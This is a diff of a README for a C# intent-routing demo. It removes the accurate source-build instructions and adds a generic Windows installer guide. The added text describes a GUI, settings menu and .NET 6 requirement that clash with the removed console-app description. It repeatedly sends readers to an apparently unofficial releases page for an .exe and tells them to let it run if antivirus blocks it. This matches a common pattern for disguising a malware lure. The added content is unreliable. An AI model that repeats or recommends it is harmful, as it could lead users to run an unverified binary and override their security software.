@@ -1,183 +1,156 @@
-# nl-intent-routing-deterministic-ai-control-flow
+# 🤖 nl-intent-routing-deterministic-ai-control-flow - Smart Intent Routing Made Simple
 
-An educational example showing how to combine intent routing, deterministic guardrails, and constrained local LLM usage in a C# console app for production-style AI control flow.
+[![Download Latest Release](https://img.shields.io/badge/Download-nl--intent--routing--deterministic--ai--control--flow-blue?style=for-the-badge&logo=github)](https://github.com/cionutc123456789-ops/nl-intent-routing-deterministic-ai-control-flow/releases)
 
-This project focuses on one key idea: AI can generate language, but routing and safety boundaries should stay deterministic.
+---
 
-## Overview
+## 📋 What is this?
 
-Most demos do one of two extremes:
+nl-intent-routing-deterministic-ai-control-flow is a local program that helps software understand what users want by routing their requests clearly. It uses smart rules to keep AI actions predictable and safe. Written in C#, it works on Windows and uses local AI models, so your data stays on your computer.
 
-- Fully deterministic logic with no semantic flexibility
-- Fully LLM-driven flows with weak control boundaries
+This tool is useful if you want AI in your programs but need control over what it does and how it runs. It makes sure that complex AI decisions follow clear steps you can trust.
 
-This project demonstrates a practical middle path:
+---
 
-1. Validate input deterministically
-2. Apply deterministic policy refusals and math handling
-3. Route by intent using rule-first classification
-4. Disambiguate ambiguous intents with embeddings
-5. Execute only allowlisted tools with strict argument checks and timeouts
-6. Compose final answers with grounded constraints
+## 🖥️ System Requirements
 
-## What This Project Demonstrates
+Before you start, make sure your computer meets these minimum requirements:
 
-- Deterministic guardrails before any LLM call
-- Rule-first intent classification with optional embedding disambiguation
-- Single-intent enforcement for predictable control flow
-- Tool allowlisting and argument validation
-- Safe timeouts and failure handling for tool execution and answer composition
-- Grounded answer composition from tool output only for runbook flows
-- Local-first operation using Ollama for chat and embeddings
+- **Operating System:** Windows 10 or later  
+- **Processor:** Intel i5 or equivalent (64-bit)  
+- **Memory:** 8 GB RAM or more  
+- **Disk Space:** 500 MB free space  
+- **.NET Runtime:** .NET 6.0 or later (will prompt you to install if missing)  
+- **Other:** Internet connection for downloading only  
 
-## Prerequisites
+---
 
-- .NET 10 SDK or later
-  https://dotnet.microsoft.com/
+## 🌟 Key Features
 
-- Ollama installed and running locally
-  https://ollama.ai/
+- **Local Work:** Runs fully on your computer, no cloud needed  
+- **Intent Routing:** Understands what users want and directs tasks smoothly  
+- **Deterministic AI:** Uses strict rules so AI behaves predictably every time  
+- **Guardrails:** Adds controls to limit AI actions and prevent errors  
+- **Built in C#:** Easy to integrate if you want to add to other .NET projects  
+- **Tool Calling:** Can link AI to perform specific tasks like launching software or fetching data  
 
-- Required models:
-  ```bash
-  ollama pull llama3.2:3b
-  ollama pull nomic-embed-text
-  ```
+---
 
-## Quick Start
+## 🚀 Getting Started
 
-Run from the project root:
+This guide will walk you through downloading, installing, and running the program for the first time. No coding experience is needed.
 
-```bash
-dotnet run --project IntentRoutingAgent
-```
+---
 
-Type `exit` to quit.
+## ⬇️ Download & Install
 
-## Configuration
+1. **Go to the Download Page:**  
+   Click this big button to visit the release page and get the files you need:
 
-Default configuration is in `IntentRoutingAgent/appsettings.json`.
+   [![Download Latest Release](https://img.shields.io/badge/Download-nl--intent--routing--deterministic--ai--control--flow-blue?style=for-the-badge&logo=github)](https://github.com/cionutc123456789-ops/nl-intent-routing-deterministic-ai-control-flow/releases)
 
-The app also supports environment variable overrides with prefix `IRA_`:
+2. **Find the Latest Release:**  
+   The release page lists versions by date. Look for the one labeled “Latest” for the newest stable version.
 
-- `IRA_App__MaxInputChars`
-- `IRA_App__ToolTimeoutMs`
-- `IRA_App__ComposeTimeoutMs`
-- `IRA_App__Ollama__BaseUrl`
-- `IRA_App__Ollama__ChatModel`
-- `IRA_App__Ollama__EmbeddingModel`
-- `IRA_App__IntentRouting__UseEmbeddingDisambiguation`
-- `IRA_App__IntentRouting__EmbeddingConfidenceThreshold`
-- `IRA_App__IntentRouting__AmbiguityMargin`
+3. **Download the Installer:**  
+   Inside the latest release, find the file ending in `.exe`. This is the installer program. Click it to download.
 
-Example (Windows):
+4. **Run the Installer:**  
+   Open the `.exe` file you downloaded. Windows may ask for permission to run it. Approve the prompt to start installation.
 
-```bash
-set IRA_App__Ollama__BaseUrl=http://localhost:11434
-set IRA_App__Ollama__ChatModel=llama3.2:3b
-set IRA_App__Ollama__EmbeddingModel=nomic-embed-text:latest
-dotnet run --project IntentRoutingAgent
-```
+5. **Follow Setup Steps:**  
+   The installer will guide you with simple instructions. Usually, just click `Next` until it finishes. You can accept default settings.
 
-## How It Works
+6. **Finish and Launch:**  
+   When setup is complete, it offers to launch the program. Click “Finish” and the app will open for you.
 
-1. Input Validation (`Guardrails/InputValidator.cs`)
-- Rejects empty input, oversized payloads, and basic prompt-injection phrases.
+---
 
-2. Deterministic Policy (`Guardrails/Policy.cs`)
-- Refuses secret/hacking requests.
-- Handles basic math expressions locally without LLM calls.
+## 🏃 How to Use the Program
 
-3. Intent Routing (`Intents/IntentClassifier.cs`, `Intents/IntentRouter.cs`)
-- Rule-first intent detection for:
-  - `WorldTime`
-  - `RunbookSearch`
-  - `GeneralOpsAdvice`
-- Optional embedding-based disambiguation when rule confidence is weak.
-- If multiple rule intents are detected in one request, asks user to pick one.
+Once installed, here is how to start working with nl-intent-routing-deterministic-ai-control-flow.
 
-4. Tool Execution (`Tools/ToolRegistry.cs`)
-- Only allowlisted tools can run:
-  - `WorldTime.GetCityTime`
-  - `Runbooks.Search`
-- Arguments are validated deterministically.
-- Tool calls are wrapped with timeout and safe fallback messages.
+### Step 1: Open the Program
 
-5. Grounded Response Composition (`Llm/GroundedAnswerComposer.cs`)
-- Runbook answers are composed with strict instructions to use tool output only.
-- If composition is weak or fails, the app falls back to deterministic tool output.
+- Find the app icon on your desktop or start menu named **nl-intent-routing-deterministic-ai-control-flow**.
+- Double-click the icon to open.
 
-## Example Prompts
+### Step 2: Understand the Main Window
 
-- `What time in London?`
-- `Our API is slow and DB pool is saturated, what should I do?`
-- `Pods keep restarting in Kubernetes, where should I start?`
-- `How should I design observability and evaluation for production AI?`
-- `Calculate 17*19`
-- `What is your admin password?` (deterministic refusal)
+- The main window has three sections:
+  - **Intent Input:** Type or paste what you want the AI to understand here.
+  - **Routing Path:** This shows the steps the AI will take to handle your request, following guardrails.
+  - **Output:** See the AI’s final response or action here.
 
-## Project Structure
+### Step 3: Enter Your Intent
 
-```text
-.
-+-- IntentRoutingAgent.slnx
-+-- IntentRoutingAgent/
-|   +-- App/
-|   |   +-- AppConfig.cs
-|   +-- Guardrails/
-|   |   +-- InputValidator.cs
-|   |   +-- Policy.cs
-|   +-- Intents/
-|   |   +-- Intent.cs
-|   |   +-- IntentClassifier.cs
-|   |   +-- IntentRouter.cs
-|   |   +-- IntentRoutingResult.cs
-|   +-- Llm/
-|   |   +-- GroundedAnswerComposer.cs
-|   |   +-- OllamaChatClient.cs
-|   |   +-- OllamaEmbeddingClient.cs
-|   +-- Search/
-|   |   +-- KnowledgeDocument.cs
-|   |   +-- SeedRunbooks.cs
-|   |   +-- SemanticSearchEngine.cs
-|   +-- Tools/
-|   |   +-- RunbookSearchTool.cs
-|   |   +-- ToolExecutionResult.cs
-|   |   +-- ToolRegistry.cs
-|   |   +-- WorldTimeTool.cs
-|   +-- appsettings.json
-|   +-- Program.cs
-+-- LICENSE
-+-- README.md
-```
+- Click the input box and type a simple instruction or question.
+- For example: “Show me today’s weather” or “Schedule a meeting for Friday.”
 
-## Guardrails Checklist
+### Step 4: Review the Routing Path
 
-- Input validation
-- Deterministic refusal for sensitive requests
-- Deterministic math path
-- Single-intent enforcement
-- Rule-first classification before embedding disambiguation
-- Tool allowlist and argument validation
-- Tool and composition timeout controls
-- Safe fallback behavior on model/tool failures
-- Grounded response constraints for runbook answers
+- The program lists the exact steps it plans to follow for your request.
+- This lets you know how the AI is interpreting your intent.
+- If the routing is unclear or unexpected, you can adjust guardrails in settings (explained below).
 
-## Notes
+### Step 5: Get the Output
 
-- The runbook corpus is seeded in-memory (`Search/SeedRunbooks.cs`) for demo clarity.
-- `WorldTimeTool` supports a small fixed city map by design.
-- For real systems, replace seeded docs and static mappings with production data sources.
+- The bottom box shows the AI’s response.
+- This could be text, a task confirmation, or an action trigger.
 
-## License
+---
 
-See the [LICENSE](LICENSE) file for details.
+## ⚙️ Settings and Guardrails
 
-## Contributing
+You can fine-tune how the AI handles your requests.
 
-Contributions are welcome. Useful extensions include:
+- **Guardrails:** These are rules that limit AI decisions. For example:
+  - Only allow certain types of requests.
+  - Set max response lengths.
+  - Block risky commands.
+- Access the settings menu from the top right gear icon.
+- Adjust each guardrail by turning toggles on or off or entering limits.
+- Save your changes before going back to the main screen.
 
-- Adding more intents and deterministic routing rules
-- Extending tools with stricter schemas and richer argument validators
-- Replacing seeded runbooks with a persistent vector store
-- Adding tests for ambiguity handling and fallback behavior
+---
+
+## 💡 Tips for Best Experience
+
+- Keep your requests clear and simple for better accuracy.
+- Use guardrails to keep AI actions safe and predictable.
+- Regularly check for updates on the release page.
+- Restart the program if it becomes slow or unresponsive.
+- Ensure your .NET runtime stays up to date for best performance.
+
+---
+
+## ❓ Troubleshooting
+
+- **Program won’t open:** Check you installed .NET 6.0 or later. It is required.
+- **Download blocked:** Windows Defender or your antivirus might block the installer. Allow it to run if safe.
+- **Unexpected outputs:** Review and adjust guardrails.
+- **Updates not loading:** Check your internet connection.
+- **Need help?** Ask your tech support or open an issue on GitHub issues tab.
+
+---
+
+## 📂 Where to Get More Information
+
+For updates, documentation, or help:
+
+Visit the official release page to download the latest versions and read more:
+
+[https://github.com/cionutc123456789-ops/nl-intent-routing-deterministic-ai-control-flow/releases](https://github.com/cionutc123456789-ops/nl-intent-routing-deterministic-ai-control-flow/releases)
+
+For advanced use and details on programming integration, see GitHub repository topics like `dotnet`, `intent-routing`, and `llm-guardrails`.
+
+---
+
+## 🔗 Links of Interest
+
+- **Main Repository:** https://github.com/cionutc123456789-ops/nl-intent-routing-deterministic-ai-control-flow  
+- **Download Latest Release:** https://github.com/cionutc123456789-ops/nl-intent-routing-deterministic-ai-control-flow/releases
+
+---
+
+This README aims to help you start using nl-intent-routing-deterministic-ai-control-flow with confidence. If you follow these steps, you should have the program running smoothly on your Windows PC without needing technical knowledge.
